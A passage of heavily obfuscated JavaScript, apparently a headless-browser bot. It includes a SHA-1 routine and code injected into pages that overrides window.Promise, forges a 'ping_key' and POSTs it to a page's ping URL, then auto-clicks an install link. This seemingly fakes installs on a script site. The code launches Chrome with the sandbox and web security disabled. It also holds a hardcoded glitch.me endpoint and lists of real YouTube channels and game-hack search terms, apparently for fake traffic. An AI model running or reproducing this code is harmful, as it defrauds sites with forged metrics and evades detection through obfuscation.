                return this['bytes'] > -0x6146a674 + -0x22b2c058 * -0x1 + -0xdd9e89d * -0x17 && (this['hBytes'] += this['bytes'] / (0x1dcd21630 + -0x2 * -0xc9938fd2 + -0x26ff935d4) << 0x37a * 0x7 + 0x115d + -0x29b3, this['bytes'] = this['bytes'] % (-0xcdcc8f4 * -0xd + 0x164e254c + 0x427ba650)), this;
              }
            }
            ['finalize']() {
              if (!this['finalized']) {
                this['finalized'] = -0x1 * -0x18f2 + -0x1 * -0x123b + -0x2b2c;
                var J = this['blocks'],
                  K = this['lastByteIn' + 'dex'];
                J[0xa * -0x371 + -0x99d + 0x1 * 0x2c17] = this['block'], J[K >> 0x1174 + 0x24cc + 0x35 * -0x106] |= x[-0x18 + 0xe17 + -0xdfc & K], this['block'] = J[0x43e + 0x185 * -0xf + 0x3b9 * 0x5], K >= 0x4 * 0x28c + 0x1 * 0x2075 + -0x2a6d && (this['hashed'] || this['hash'](), J[0x4 * -0x8c6 + -0x163d + 0x3955] = this['block'], J[0x1a * -0x177 + -0x24cf * -0x1 + 0x157] = J[-0x13d8 + -0x319 + 0x16f2] = J[-0x8 * -0x3a + -0x59f * 0x1 + 0x3d1] = J[0x439 + -0x26b6 + 0x2280] = J[0x14d7 + 0x8 * -0x385 + 0x755] = J[0xa * -0xb9 + 0x8da * -0x3 + 0x21cd] = J[-0x1d59 * -0x1 + 0x708 + -0x245b] = J[-0xacb + -0x2237 * 0x1 + 0x501 * 0x9] = J[0x122d + 0xa11 + -0xe1b * 0x2] = J[0x1c67 * 0x1 + -0x1 * -0xbf0 + 0x4d * -0x86] = J[-0x20cb * 0x1 + 0x1153 + -0xf82 * -0x1] = J[-0xd1 * -0x1a + 0xa6f + -0x1f9e] = J[0xf20 + -0x1 * 0x2405 + 0x14f1] = J[0x1e2f * -0x1 + 0x1750 + 0x6ec] = J[0x122a + 0x7 * 0x46b + -0x3109 * 0x1] = J[-0x1c7b + 0x2 * 0xef2 + 0x15a * -0x1] = -0xe1d * -0x1 + 0x2 * 0xa6f + -0x22fb), J[0x1505 + 0x15f2 + -0x2ae9] = this['hBytes'] << -0x15f3 + -0x35 * -0xa4 + 0xa * -0x133 | this['bytes'] >>> -0x1 * -0x18a5 + 0x4f9 * 0x3 + -0x2773, J[-0x1 * -0x2029 + 0x3 * 0x3ab + -0x2b1b] = this['bytes'] << -0x2696 + 0x322 * 0x5 + 0x16ef, this['hash']();
              }
            }
            ['hash']() {
              var J, K, L = this['h0'],
                M = this['h1'],
                N = this['h2'],
                O = this['h3'],
                P = this['h4'],
                Q = this['blocks'];
              for (J = 0x2315 + 0xa39 + -0x2d3e; J < -0xb7a * 0x1 + 0x256c + -0x1 * 0x19a2; ++J)
                K = Q[J - (0x343 * 0x4 + 0x1c9 + -0xed2)] ^ Q[J - (-0x1 * 0x176b + -0x134c + -0x2abf * -0x1)] ^ Q[J - (0x25c7 + -0x4 * -0x77b + 0x43a5 * -0x1)] ^ Q[J - (-0xe79 + 0x2 * 0x703 + -0x83 * -0x1)], Q[J] = K << 0x4 * 0x3fd + -0x8 * -0x164 + -0x1b13 | K >>> 0x13 * 0xf7 + -0x20b9 + 0xe83;
              for (J = -0x8d8 + 0x1456 + -0xb7e; J < -0x1 * -0x38b + -0x1032 + -0xcbb * -0x1; J += 0xd3a + 0x24ca + -0x31ff)
                L = (K = (M = (K = (N = (K = (O = (K = (P = (K = L << 0x153c + 0x1 * 0x578 + 0x26d * -0xb | L >>> -0xd7 * 0x3 + 0x81d * -0x4 + -0x1 * -0x2314) + (M & N | ~M & O) + P + (0x27cac424 + 0x6cf8c0d9 + -0x3a410b64) + Q[J] << -0x1d74 + -0x185c + 0x1 * 0x35d0) << -0x57 * 0x1c + 0x19b0 + -0x1027 | P >>> 0xf3 * 0x3 + -0xb * 0x2f3 + 0x1db3) + (L & (M = M << -0x1c1 * -0x16 + 0x66 * 0x57 + 0x1 * -0x4922 | M >>> 0x67 * 0x1d + -0x22b8 + 0x170f * 0x1) | ~L & N) + O + (-0x2 * -0x284f4c2f + 0x249a9e * 0x1ad + -0x3373398b) + Q[J + (-0xb9 * 0xb + 0x1 * -0x2153 + 0x2947)] << -0x1367 * -0x1 + 0x1 * 0x1f40 + 0x32a7 * -0x1) << 0x21a3 + -0x1 * -0x1f2e + 0x16 * -0x2f2 | O >>> 0x2167 + 0xbad + -0x2cf9 * 0x1) + (P & (L = L << 0x142a + -0x3 * -0xab3 + -0x3425 | L >>> -0x1317 + -0x25c6 + 0x38df) | ~P & M) + N + (-0x2 * 0x28ecfcb3 + -0xc * -0xd8f486 + 0xa230fcb7) + Q[J + (0x4 * 0x3bc + -0x170c + 0x81e)] << -0x2494 + 0xcb0 + 0x17e4) << -0x12 * 0xbf + 0x25d3 + -0x410 * 0x6 | N >>> -0x2d0 + 0x22 * 0xa7 + -0x1343 * 0x1) + (O & (P = P << 0x1 * 0x24df + -0x12bb + -0x1206 | P >>> -0x18d7 + 0x2 * -0xdbd + 0x3453) | ~O & L) + M + (-0x5bb5e04 + -0x87cae154 + 0xe808b8f1) + Q[J + (0x12fe + -0xc35 + -0x6c6)] << -0x25a0 + 0x539 + -0xf * -0x229) << -0xe * -0x1fb + 0x45 + -0xdfd * 0x2 | M >>> 0x1da5 + 0x1e64 + -0x3bee) + (N & (O = O << 0xb64 * -0x1 + 0x2021 + -0x149f | O >>> -0x1cc + -0x1 * 0x20ff + 0x22cd) | ~N & P) + L + (-0x228384cb + 0x4ca8158c + -0x1 * -0x305de8d8) + Q[J + (0xed7 + 0x42d * -0x1 + -0x2f * 0x3a)] << 0x14f * 0x15 + 0x90d + 0x7 * -0x538, N = N << -0x22f3 * 0x1 + 0x1 * -0x12be + 0x35cf | N >>> 0x1 * -0xd7b + 0x567 + 0x816;
              for (; J < -0xc3f + 0x38f * -0x1 + 0x9 * 0x1c6; J += -0x154f + 0x110a + -0xb7 * -0x6)
                L = (K = (M = (K = (N = (K = (O = (K = (P = (K = L << 0x2 * 0xaa6 + -0xa1d * -0x1 + 0x1c * -0x11f | L >>> 0x1581 + -0x1d0a + 0x7a4) + (M ^ N ^ O) + P + (0x93c30c * -0xf3 + -0x3ab1bbdd + 0x1620fc47 * 0xe) + Q[J] << 0x1965 + 0x13 * -0x1ad + 0x672) << 0x259 * 0x5 + 0x1 * 0xc1 + 0xc79 * -0x1 | P >>> -0x1 * -0x104 + -0x4d6 + -0x3 * -0x14f) + (L ^ (M = M << 0x267 * 0x9 + -0x1 * 0x832 + -0xd4f | M >>> -0x4a * 0x62 + 0x1c34 + -0x2 * -0x11) ^ N) + O + (0xbf5f6ffd + 0x20d80 * 0x4159 + -0x4 * 0x35aa6d77) + Q[J + (0xc55 + 0x3fe + 0x1 * -0x1052)] << -0x4 * -0x241 + 0x47d + -0xd81) << 0x6a4 + -0x2 * -0x1281 + 0x9 * -0x4d9 | O >>> -0xf4 + 0x5a3 * -0x1 + 0x2 * 0x359) + (P ^ (L = L << 0x2b4 * -0x3 + -0xc * 0x1f9 + 0x1fe6 * 0x1 | L >>> 0x27 * -0xe6 + 0x92a + 0x19e2) ^ M) + N + (-0x5c4414ec + -0x23c4089f + 0xeee2092c) + Q[J + (-0x2062 + -0x4 * 0x64b + -0xc * -0x4cc)] << 0x305 * -0x6 + 0x1 * 0x2239 + -0x101b) << 0xa3a + 0x27c + -0xcb1 | N >>> 0x1a02 * -0x1 + -0xc00 + 0x377 * 0xb) + (O ^ (P = P << -0x2538 + 0x39f + 0x21b7 | P >>> -0x1ca7 * -0x1 + -0x2b6 * -0x1 + 0x15d * -0x17) ^ L) + M + (-0x8ae0d39a + -0xb3 * 0x100196 + -0xa7bff * -0x18e3) + Q[J + (-0x144d * 0x1 + -0x1 * 0x946 + 0x1d96 * 0x1)] << -0x3 * -0x8ad + 0xf53 * -0x1 + 0xa * -0x112) << -0xa * 0x30c + 0x97b + 0x1502 | M >>> -0xeb2 + 0x237a * 0x1 + -0x14ad) + (N ^ (O = O << 0x166 * 0x9 + 0xa86 + -0x16fe | O >>> -0x630 + -0x6 * -0x5eb + -0x1d50) ^ P) + L + (-0x3adcf61f + 0x3 * 0x235dc6b6 + 0x3f9d8d9e) + Q[J + (0x1c5b + 0x1d7a + 0x30b * -0x13)] << 0xf1 * 0x23 + -0x15 * 0xfd + -0xc32, N = N << -0x4f + -0x1a97 + 0x1b04 | N >>> -0x2439 + -0x24a + 0x2685;
              for (; J < 0x68f + 0x1bf7 + 0x9a * -0x39; J += 0x1 * -0x1eff + 0x1d0d * 0x1 + -0x1 * -0x1f7)
                L = (K = (M = (K = (N = (K = (O = (K = (P = (K = L << 0x1 * -0xc2f + -0x6 * -0x19e + 0x280 | L >>> 0x1cb0 + -0x12b8 * 0x1 + -0x5 * 0x1f9) + (M & N | M & O | N & O) + P - (0x2e57867f + -0x30c3498 + 0x4598f13d) + Q[J] << -0x1b54 + 0x4a2 * -0x3 + 0x1 * 0x293a) << 0x85 + -0x232e * -0x1 + -0x11d7 * 0x2 | P >>> -0x1e27 + 0x218 * -0x5 + 0x28ba) + (L & (M = M << -0x1 * -0xcab + -0x79b * 0x4 + 0xf * 0x131 | M >>> 0x12cd * 0x1 + -0xbb * 0x1a + 0x11 * 0x3) | L & N | M & N) + O - (-0x9059d2a9 + -0xdc63ff88 + 0x131af69d * 0x19) + Q[J + (0xcef + -0x547 * -0x1 + -0x4f * 0x3b)] << 0xaec + -0x2 * -0xa4a + -0x1f80) << -0x1b50 + -0x16f * 0x16 + -0x7 * -0x869 | O >>> 0x87e * -0x1 + -0x223a * 0x1 + 0x2ad3) + (P & (L = L << 0x7dc + -0x17a9 + 0xfeb | L >>> 0x18f5 + -0x1 * 0x1935 + -0x42 * -0x1) | P & M | L & M) + N - (-0x6ffda27f + 0x3fdd2feb + -0x84f854 * -0x136) + Q[J + (0xad + -0x1100 + 0x1055)] << 0x12f2 + -0x2035 + 0xd43) << -0x2429 * -0x1 + -0x133d + -0x10e7 * 0x1 | N >>> 0x79 * 0x1d + 0x48a + 0x81 * -0x24) + (O & (P = P << -0xe30 + 0x3 * 0x4a7 + 0x59 | P >>> 0x10a2 + 0x4 * -0x417 + 0x44 * -0x1) | O & L | P & L) + M - (0x870b3df3 + -0x147427 * 0x62d + 0x682a5a0c) + Q[J + (-0x2277 + -0x1 * -0x193a + 0x1 * 0x940)] << 0x2df * 0x9 + 0x37 * -0xa2 + 0x8f7) << -0x2 * 0xc5e + 0x1e0 + -0x16e1 * -0x1 | M >>> 0x1 * -0x1669 + -0x7 * -0xa2 + -0x90b * -0x2) + (N & (O = O << 0x207 * -0x1 + -0x1752 + 0x1977 | O >>> -0x3d + 0x12df * -0x2 + -0x25fd * -0x1) | N & P | O & P) + L - (0x4a691945 * -0x2 + 0x65f5b651 * 0x2 + 0x39cb090c) + Q[J + (-0x21cf + 0x1de2 + 0x1 * 0x3f1)] << 0x3f9 * 0x3 + 0x1 * -0x1384 + -0x1 * -0x799, N = N << -0xd61 + 0x1 * -0xa63 + -0x1 * -0x17e2 | N >>> 0x7f3 + 0x1 * -0x156a + 0xd79;
              for (; J < -0xf1 * -0x6 + 0x1a66 + -0xc * 0x2a5; J += -0x5f * 0x9 + -0x1ea9 + -0x3 * -0xb57)
                L = (K = (M = (K = (N = (K = (O = (K = (P = (K = L << -0x1 * 0x20e3 + -0x76e + 0x3 * 0xd72 | L >>> -0x2499 + -0x1 * 0x1777 + 0x3c2b * 0x1) + (M ^ N ^ O) + P - (0x606677c9 + 0x2414dcc8 + -0x4ede1667) + Q[J] << 0x399 * 0x9 + 0x4db + -0x253c * 0x1) << 0x4 * 0x81 + -0x223f + 0xc0 * 0x2b | P >>> 0x3 * 0x893 + -0x87a + -0x1124) + (L ^ (M = M << 0x1 * 0x4cf + -0xf3c + 0xa8b | M >>> -0x1 * 0x60e + -0x2f * -0x59 + -0x36d * 0x3) ^ N) + O - (0x59e58003 + -0x3925b129 + 0x14dd6f50) + Q[J + (-0x135d * 0x1 + -0xd09 + 0x18b * 0x15)] << 0x117 * -0x3 + -0x86b * -0x2 + -0xd91) << 0x1b6 * -0x1 + 0x254c + 0xf * -0x25f | O >>> -0x1f44 + -0x1e9 + 0x2 * 0x10a4) + (P ^ (L = L << -0x2437 + -0x4bb * 0x1 + -0x9 * -0x490 | L >>> -0x454 * -0x5 + -0x583 * -0x7 + -0x1 * 0x3c37) ^ M) + N - (-0x24089837 + 0x28bf60 * -0xdf + -0x570e4a7 * -0x17) + Q[J + (-0x1b68 + 0x1159 * 0x2 + -0x748)] << -0x84a * -0x2 + -0x96b + -0x729) << -0xe92 + -0x106 * -0x4 + -0xa7f * -0x1 | N >>> -0x2555 + -0x59 * 0x53 + 0x424b) + (O ^ (P = P << -0x1 * 0x47 + 0xa6f + -0x505 * 0x2 | P >>> 0x2 * -0x8b0 + -0x2 * -0xd79 + -0x990) ^ L) + M - (-0x24731347 + 0x2147f * -0xa80 + 0x3 * 0x254d2cfb) + Q[J + (-0x5a5 + -0x2624 + -0x4 * -0xaf3)] << 0x1 * -0x1e2b + 0x153b * -0x1 + 0x3366) << -0x210c + -0x2 * 0x1227 + -0x19d * -0x2b | M >>> -0x321 * 0x3 + -0x1 * 0x10f + -0xa8d * -0x1) + (N ^ (O = O << -0x29 * -0xb7 + 0x547 + -0x2278 | O >>> -0x11d9 + 0x1 * -0x4a3 + -0x167e * -0x1) ^ P) + L - (0x3992a29a + -0x72b9dc * -0xbb + -0x57c32824) + Q[J + (-0x1edc + -0x1744 + 0x3624)] << -0xee5 + 0x5d4 * 0x1 + -0x911 * -0x1, N = N << -0x228a + -0x5b5 * -0x2 + -0x173e * -0x1 | N >>> -0x1d41 + 0x20c * -0x1 + 0x1f4f;
              this['h0'] = this['h0'] + L << 0x1ec8 + -0x150e + 0x33e * -0x3, this['h1'] = this['h1'] + M << 0x1456 + -0x1adf + 0x689, this['h2'] = this['h2'] + N << -0x2 * -0x1159 + -0x7 * 0x199 + 0x1cf * -0xd, this['h3'] = this['h3'] + O << 0x13 * 0x29 + 0x13e4 + 0x7a5 * -0x3, this['h4'] = this['h4'] + P << -0x756 * 0x2 + 0x1896 + -0x1a7 * 0x6;
            }
            ['hex']() {
              this['finalize']();
              var J = this['h0'],
                K = this['h1'],
                L = this['h2'],
                M = this['h3'],
                N = this['h4'];
              return w[J >> 0x1 * -0x21f1 + 0x3d2 * 0x2 + 0x1a69 & -0x255b + -0x1c76 + 0x4 * 0x1078] + w[J >> 0x8 * -0x3a7 + 0x206a + -0x18d * 0x2 & 0x5 * 0x113 + -0xc3d * -0x1 + -0x1 * 0x118d] + w[J >> 0x12f0 + -0x1553 + 0x277 & -0x8e9 * 0x3 + -0x973 + 0x243d] + w[J >> 0x11 * -0x1dc + 0x1c61 + 0x34b & 0x281 * -0x1 + -0xd30 + 0x7e * 0x20] + w[J >> -0x1 * -0x24e9 + 0x32b * -0x5 + -0x1506 & -0x135d * -0x2 + 0x111c + -0x6d * 0x83] + w[J >> -0x1 * 0x6e4 + 0x259 * -0xd + 0x2571 & 0xea8 + 0xaba + 0x3 * -0x871] + w[J >> -0x927 + 0xe0 * 0x1d + 0x567 * -0x3 & 0x1d6f * -0x1 + 0x139e + 0x9e0] + w[-0x23f8 + -0x46 * -0x29 + 0x18d1 * 0x1 & J] + w[K >> 0x6 * 0x6a + 0x1 * -0x11de + 0xf7e & -0xd02 + 0x2 * -0xb3 + 0xe77] + w[K >> 0x1f64 + 0x85 + -0x1fd1 & -0x1 * -0x6a0 + 0xa63 * 0x2 + 0x1b57 * -0x1] + w[K >> 0x2183 + -0xcb * -0x27 + -0x405c & -0x17da + -0x26ad * -0x1 + -0xec4] + w[K >> -0x10d2 + -0x16c * 0x15 + 0x2ebe & -0x1cf6 + 0xc6e + -0x1097 * -0x1] + w[K >> 0x1 * 0x11ff + -0x3 * 0x982 + 0xa93 & -0x2f9 + -0x93a * 0x2 + 0x157c] + w[K >> -0x13b8 + -0x2e * -0x43 + 0x7b6 & 0x1ab9 + -0x23 * -0x7f + -0x2c07] + w[K >> -0x625 + -0x22fe + 0x2927 & -0xfb1 + -0x1f8d + 0x2f4d] + w[-0x25e7 + -0x4 * -0x1df + 0x53 * 0x5e & K] + w[L >> -0x1407 + -0x3 * -0x586 + 0x391 * 0x1 & -0x1 * 0x2f1 + 0x7 * -0x2fe + 0x17f2] + w[L >> -0x11e7 * 0x2 + 0xb * 0x109 + 0x1883 * 0x1 & 0x21bc + 0xe6b + -0x8 * 0x603] + w[L >> 0x144d + -0x17f3 + -0x1dd * -0x2 & -0x7 * -0x15b + -0xe69 + 0x3 * 0x1a9] + w[L >> 0x2120 + -0x15be * 0x1 + -0xb52 & 0x19 * 0xfb + 0x1436 + 0x1655 * -0x2] + w[L >> -0x23a7 + -0x15d5 + 0x3988 & 0xbab + 0x9 * 0x155 + -0x1799] + w[L >> 0x9d1 + -0xe89 + -0x2 * -0x260 & -0x1b22 + 0x22d8 + -0x7a7] + w[L >> 0x1423 + 0xb3c + -0x1f5b & 0x119f + -0xdb2 + -0x1ef * 0x2] + w[0x223 * 0x8 + -0x1301 + 0x1f8 & L] + w[M >> 0x24a7 * -0x1 + 0x112 * 0x3 + 0x218d & 0xdc * -0x20 + -0x13be + 0x2f4d] + w[M >> 0x26fd + -0x9f * -0x3b + -0xb * 0x6de & 0x2386 + -0xe * 0x29c + 0x111] + w[M >> 0x2392 + -0x1753 + -0xc2b & -0x1 * 0x145a + -0x1436 + 0x1 * 0x289f] + w[M >> 0xb * -0x345 + 0x1 * -0x1f7 + 0x25fe & 0x1128 + 0x3 * 0x3db + -0x1caa] + w[M >> 0x131a + 0xd * -0x239 + 0x9d7 & -0x2e4 + -0x1f7 + 0x4a * 0x11] + w[M >> 0x1ae9 + 0x8af + -0x2390 & 0x87a + 0x1cf6 + -0x2561] + w[M >> 0x19ed * 0x1 + -0x233 * -0x3 + -0x2082 & 0x260f * -0x1 + -0xb15 * -0x1 + 0x1b09] + w[0xa0d + -0x1 * 0x4b3 + -0x54b & M] + w[N >> -0x22 * 0xdc + -0x20d7 + 0x3e2b & -0x303 + -0x2313 + -0x28b * -0xf] + w[N >> -0x1 * -0xdd8 + -0x197d + 0xbbd & 0x7e5 + -0xe8 * -0x8 + 0xf16 * -0x1] + w[N >> 0x2a1 + -0x1289 + -0x174 * -0xb & -0xfb5 * -0x1 + -0xf1 * -0xd + -0x1be3] + w[N >> -0x7e0 + -0xef3 + 0x16e3 & 0x4 * -0x113 + -0x1eea + 0x2345 * 0x1] + w[N >> 0x15 * -0x4d + 0x13e8 + -0xd8b * 0x1 & -0x739 + -0x2 * 0xfd1 + 0x26ea] + w[N >> -0x4ae * -0x5 + 0x20d2 * -0x1 + 0x6e * 0x16 & 0x3 * 0xab + 0x184a + -0x1a3c] + w[N >> 0x1 * 0x2fa + -0xf * -0x27 + 0x11 * -0x4f & -0x3f2 * -0x1 + 0x1 * -0x2077 + -0x3b * -0x7c] + w[0x120b * -0x2 + -0x19d7 + 0x3dfc & N];
            }
            ['digest']() {
              this['finalize']();
              var J = this['h0'],
                K = this['h1'],
                L = this['h2'],
                M = this['h3'],
                N = this['h4'];
              return [
                J >> -0x2 * -0xf38 + -0x31 * -0x95 + -0x3add & -0x30 * 0x65 + -0x21c5 + 0x35b4,
                J >> 0x1144 + -0x2c4 + -0xe70 & -0x1eb + 0x4f5 * -0x7 + -0x259d * -0x1,
                J >> -0x1d0c + -0x11 * -0x40 + 0x18d4 & -0xb * 0x1f1 + 0x1a7a + -0x420,
                0x1 * -0x10b4 + 0x1 * 0x15c8 + -0x415 & J,
                K >> 0x2573 * -0x1 + 0x2369 + 0xe * 0x27 & -0x109 + 0x2365 + -0xd * 0x291,
                K >> 0x52 * 0x6b + -0x1b94 + -0x6a2 & 0x1 * 0x532 + -0x1777 + 0x1344,
                K >> 0x1271 + -0x171d + 0x4b4 & 0x1 * -0x1336 + 0x1524 + -0xef,
                -0x2674 + 0x18b2 + 0xec1 & K,
                L >> -0x23 * 0x4 + 0x205e + -0x1fba & -0x264e + 0x166d + -0x2d0 * -0x6,
                L >> 0xdf8 + -0x15d2 + 0x3f5 * 0x2 & -0xd40 + 0x3c9 * -0x1 + 0x1208,
                L >> -0x4e5 + -0x876 * 0x4 + 0x7c1 * 0x5 & -0x1 * 0x1d68 + -0x348 + -0x21af * -0x1,
                -0xa32 + -0x7b * 0x13 + -0x12 * -0x121 & L,
                M >> -0x2d3 + 0x13e6 + -0x10fb & 0x9 * 0x1fd + 0xf4d + -0x2033,
                M >> 0x7cf * 0x1 + 0x3 * 0x419 + -0x10e * 0x13 & -0x3b9 + 0x22d3 + -0x1e1b,
                M >> -0x264e + 0x1 * -0x22d6 + 0x37c * 0x15 & 0x10fc + 0x214c + 0xb * -0x47b,
                -0x91c + 0x1f7 * -0x3 + 0x1000 & M,
                N >> 0xf * 0x14b + -0x2214 + -0xec7 * -0x1 & -0x766 * 0x1 + -0x12cf + 0x1b34,
                N >> -0x13 * 0x191 + 0x396 + -0x1a3d * -0x1 & 0x26e1 * -0x1 + 0x1cad + 0xb33,
                N >> -0x22e1 + -0xb76 + -0x1 * -0x2e5f & -0x658 + 0x1363 + 0xc0c * -0x1,
                0x1310 + 0x1b0a + -0x2d1b & N
              ];
            }
            ['arrayBuffe' + 'r']() {
              var J, K;
              return this['finalize'](), J = new ArrayBuffer(-0x2473 + -0x218c + 0x4613), (K = new DataView(J))['setUint32'](-0x9a6 + -0x1 * 0x6fa + 0x10a0, this['h0']), K['setUint32'](0x1e06 + 0x21b6 + -0x3fb8, this['h1']), K['setUint32'](0x1 * 0xdd + 0x296 + 0x23 * -0x19, this['h2']), K['setUint32'](-0x1a8 + -0x205b + 0x1 * 0x220f, this['h3']), K['setUint32'](0x1 * -0xda3 + 0x11f * -0xa + 0x18e9, this['h4']), J;
            }
        }
        G['prototype']['toString'] = G['prototype']['hex'], G['prototype']['array'] = G['prototype']['digest'];
        const H = C();
        window['localStora' + 'ge']['setItem']('manualOver' + 'rideInstal' + 'lJS', '1');
        let I = document['getElement' + 'sByClassNa' + 'me']('install-li' + 'nk')[0xcf5 * -0x1 + 0x157 * 0x17 + -0x11dc];
        return window['Promise'] = class extends window['Promise'] {
          constructor(...J) {
            let K = -0x69 * 0x11 + -0x32 * 0x21 + 0xd6b;
            J[0x6d5 * -0x1 + 0xe5 * 0x6 + 0x19 * 0xf]['toString']()['includes']('getAttribu' + 'te(\x22data-p' + 'ing-url') && (J[0xd5c + 0x21 * -0x95 + -0x1 * -0x5d9] = L => {
              let M = I['getAttribu' + 'te']('data-ping-' + 'url');
              if (M) {
                let N = H(I['getAttribu' + 'te']('data-ip-ad' + 'dress') + I['getAttribu' + 'te']('data-scrip' + 't-id') + I['getAttribu' + 'te']('data-ping-' + 'key')),
                  O = new XMLHttpRequest();
                O['open']('POST', M + ('&mo=3&ping' + '_key=') + encodeURIComponent(N), 0x1777 * -0x1 + 0x26b * -0x4 + 0x2124), O['overrideMi' + 'meType']('text/plain'), O['onload'] = () => {}, O['send'](), K = -0x1323 * 0x2 + 0x1057 + 0x138 * 0x12;
              }
            }), K || super(...J);
          }
        }, window['setTimeout'](() => {
          I['click']();
        }, -0x174 + -0x5c6 + 0xd16 * 0x1), Promise['resolve'](0x24d1 + -0x4 * -0x80 + -0x26d0);
      })), log('after...'), await new Promise(w => setTimeout(w, NETWORK_PATIENCE)), await s['close'](), await r[X(0x0, 'tyk7')](), i())) : (await s['close'](), await r['close'](), i());
    }
  }
  for (let j = -0x2db + -0x1f50 + 0x222b; j < -0xb37 + 0x938 + 0x200; j++)
    i();
}

function c(b, d) {
  const e = a();
  return c = function(f, g) {
    f = f - (0x23ce + -0x5 * 0x4bc + 0xc22 * -0x1);
    let h = e[f];
    if (c['OfgAzr'] === undefined) {
      var i = function(m) {
        const n = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789+/=';
        let o = '',
          p = '';
        for (let q = 0x889 * 0x4 + -0x26bd + 0x499 * 0x1, r, s, t = 0xab8 + -0xe57 * 0x1 + 0x39f; s = m['charAt'](t++); ~s && (r = q % (0x1e4c + 0x3 * 0x8c6 + -0x389a) ? r * (-0x1af9 + -0x1 * 0x2432 + 0x3f6b) + s : s, q++ % (-0x94 + -0x1 * 0x1945 + 0x19dd * 0x1)) ? o += String['fromCharCode'](0x7cc + -0x4f6 + -0x1d7 & r >> (-(0x255f + -0x11 * 0x1c3 + 0x3b5 * -0x2) * q & -0x21cd + 0x4 * 0x2 + 0x21cb)) : 0x1b9a + -0x2438 + 0x89e) {
          s = n['indexOf'](s);
        }
        for (let u = -0x1886 + -0xb * -0x27a + 0x18 * -0x1d, v = o['length']; u < v; u++) {
          p += '%' + ('00' + o['charCodeAt'](u)['toString'](0x5 * 0x3da + -0x2688 + 0x1356))['slice'](-(-0x2 * -0x1327 + 0x1 * 0xfa7 + -0x35f3));
        }
        return decodeURIComponent(p);
      };
      c['fCaEuW'] = i, b = arguments, c['OfgAzr'] = !![];
    }
    const j = e[0xd * -0x203 + -0xb3b + 0x2562],
      k = f + j,
      l = b[k];
    return !l ? (h = c['fCaEuW'](h), b[k] = h) : h = l, h;
  }, c(b, d);
}
const NETWORK_PATIENCE = -0x3376 + 0x38 * 0x10a + -0x49 * -0x56 + (-0x1c3b + 0x730 + 0x20c3) * Math['random'](),
  MM_NETWORK_PATIENCE = (0x825 * -0x1 + 0x7ac + 0x4 * 0x1f) * NETWORK_PATIENCE,
  url = require('url'),
  doFlags = {
    'doActivateBrowser': 0x1,
    'doGF': 0x0,
    'doSoundCloud': 0x0,
    'doYT': 0x0,
    'doMediumReader': 0x0,
    'doRemoteCaptcha': 0x0,
    'doDual': 0x0,
    'doWhitepagesMode': 0x1,
    'doMiscNetActivity': 0x1,
    'doOUJS': 0x1,
    'doCreateServer': 0x1,
    'doExtFingerprint': 0x1
  },
  {
    log: log,
    warn: warn
  } = console,
  {
    floor: floor,
    random: random,
    ceil: ceil
  } = Math;
let PROCESSED_XURL_VAL = 'https://co' + 'ntent-deli' + 'very-netwo' + 'rk.glitch.' + 'me/gen_dd_' + 'adkjasbdjq' + 'wkjndwqkdw' + 'qasczxhgcx' + 'zc',
  PROCESSED_SYX_VAL = 'CX001_ZCa';
const pptOptions = {
    'headless': 0x1,
    'setDefaultNavigationTimeout': 0x0,
    'setDefaultTimeout': 0x0,
    'args': [
      '--no-sandb' + 'ox',
      '--disable-' + 'setuid-san' + 'dbox',
      '--disable-' + 'dev-shm-us' + 'age',
      '--disable-' + 'web-securi' + 'ty'
    ]
  },
  axios = require('axios'),
  fetch = require('node-fetch'),
  channels = [
    'https://ww' + 'w.youtube.' + 'com/@Taskm' + 'aster',
    'https://ww' + Y(0xa, 'nBNS') + 'com/@MrBea' + 'st',
    'https://ww' + 'w.youtube.' + 'com/channe' + 'l/UCAiLfjN' + 'XkNv24uhpz' + 'UgPa6A',
    'https://ww' + 'w.youtube.' + 'com/channe' + 'l/UCIPPMRA' + '040LQr5QPy' + 'JEbmXA',
    'https://ww' + 'w.youtube.' + 'com/channe' + 'l/UCUaT_39' + 'o1x6qWjz7K' + '2pWcgw',
    'https://ww' + 'w.youtube.' + 'com/channe' + 'l/UC4-79UO' + 'lP48-QNGgC' + 'ko5p2g',
    'https://ww' + 'w.youtube.' + 'com/@quade' + Y(0x1c, ']w@h'),
    'https://ww' + 'w.youtube.' + 'com/@watch' + 'er',
    'https://ww' + 'w.youtube.' + 'com/@Zyeni' + 'th',
    'https://ww' + 'w.youtube.' + 'com/@RyanG' + 'eorge',
    'https://ww' + 'w.youtube.' + 'com/@Legal' + 'Eagle',
    'https://ww' + 'w.youtube.' + 'com/@jacks' + 'films',
    'https://ww' + 'w.youtube.' + 'com/@fanta' + 'no',
    'https://ww' + 'w.youtube.' + 'com/@NerdE' + 'xplains',
    'https://ww' + 'w.youtube.' + 'com/@HowTo' + 'Basic',
    'https://ww' + 'w.youtube.' + 'com/channe' + Y(0x3, '@Ks&') + 'X188Riipfm' + 'vejjsg'
  ];
((() => {
  Array['prototype']['repeatExte' + 'nd'] = function(h) {
    let i = this,
      j = i;
    for (let k = 0x5 * -0x6bb + 0x2d * -0x1 + 0x21d4; k < h; k++)
      j = j['concat'](i);
    return j;
  }, Array['prototype']['random'] = function() {
    return this[floor(random() * this['length'])];
  };
  const f = new Map();
  Array['prototype']['randomFlus' + 'h'] = function(h) {
    let i = this[floor(random() * this['length'])];
    f['has'](h) || f['set'](h, new Set());
    const j = f['get'](h);
    for (; j['has'](i);)
      j['size'] === this['length'] && j['clear'](), i = this[floor(random() * this['length'])];
    return j['add'](i), i;
  };
})());
let searchTerms = [];
searchTerms['push'](('moomoo.io,' + 'moomoo.io\x20' + 'hack,moomo' + 'o.io\x20defea' + 'ting\x20hacke' + 'rs,moomooi' + 'o,moomoo.i' + 'o\x20mods,moo' + 'moo.io\x20ins' + 'ta\x20kill,mo' + 'omoo.io\x20sa' + 'ndbox,moom' + 'oo.io\x20hack' + 's,moomoo.i' + 'o\x20base,moo' + 'moo.io\x20wor' + 'ld\x20record,' + 'moomoo.io\x20' + 'hacker,moo' + 'moo.io\x20hac' + 'k\x20link,moo' + 'moo.io\x20hig' + 'h\x20score,mo' + 'omoo.io\x20tr' + 'olling,moo' + 'moo.io\x20def' + 'eating\x20aut' + 'o\x20healers,' + 'moomoo.io\x20' + 'raiding\x20ba' + 'ses,moomoo' + '.io\x20update' + ',moomoo.io' + '\x202,moomoo.' + 'io\x20tutoria' + 'l,moomoo.i' + 'o\x20gameplay' + ',moomoo.io' + '\x20new\x20updat' + 'e,moomoo.i' + 'o\x20instakil' + 'l,moomoo.i' + 'o\x20highligh' + 'ts,moomoo.' + 